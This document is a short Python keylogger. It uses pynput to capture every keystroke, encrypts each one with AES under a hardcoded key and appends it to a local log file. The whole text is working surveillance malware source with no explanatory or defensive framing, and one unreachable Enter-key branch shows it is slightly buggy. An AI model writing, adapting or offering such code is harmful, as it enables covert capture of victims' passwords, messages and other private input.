from pynput.keyboard import Listener
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

# Encryption key - should be 16, 24, or 32 bytes long for AES-128, AES-192, or AES-256 respectively
KEY = b'PasswordPassword'

def write_to_file(key):
    letter = str(key)
    # Clean up the log file
    letter = letter.replace("'", '')
    if letter == 'Key.space':
        letter = '  '
    elif letter in ('Key.shift', 'Key.shift_r', 'Key.ctrl', 'Key.cmd', 'Key.alt', 'Key.alt_r', 'Key.ctrl_r', 'Key.left', 'Key.up', 'Key.down', 'Key.right', 'Key.enter', 'Key.delete', '<269025205>', '<269025205>', 'Key.num_lock', 'Key.media_volume_up', 'Key.media_volume_down', 'Key.media_volume_mute', 'Key.f2', 'Key.esc', '<269025202>', '<269025113>', '<269025026>', '<269025027>','Key.caps_lock' , 'Key.tab'):
        letter = ''
    elif letter == 'Key.enter':
        letter = '\n'
    elif letter == 'Key.backspace':
        letter = "[BACKSPACE]"

    # Encrypt the data
    cipher = AES.new(KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(letter.encode(), AES.block_size))
    # Convert to base64 for storage
    ct = base64.b64encode(cipher.iv + ct_bytes).decode('utf-8')

    with open("log.txt", 'a') as f:
        f.write(ct + '\n')

with Listener(on_press=write_to_file) as l:
    l.join()
